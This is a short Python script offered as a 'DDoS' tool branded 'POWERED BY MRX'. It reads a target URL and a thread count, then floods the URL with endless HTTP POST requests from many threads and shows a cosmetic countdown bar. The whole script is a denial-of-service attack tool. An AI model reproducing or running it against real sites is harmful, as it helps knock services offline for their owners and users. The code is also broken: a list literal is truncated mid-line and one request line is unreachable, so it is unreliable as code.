#!/bin/python3
import requests

from threading import Thread

url = input('Url: ')

thrnom = input('Threads :')

def ddos():
    while(1<10): spam = requests.post(url)
    spam2 = requests.get(url)
for i in range(int(thrnom)):
    thr = Thread(target = ddos)
    thr.start()
import time
from progress.bar import IncrementalBar

mylist = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,1>

bar = IncrementalBar('Countdown', max = len(mylist))

for item in mylist:
    bar.next()
    time.sleep(1)

bar.finish()
print('###########[ POWERED BY MRX  ]##########')
print('succesfully')
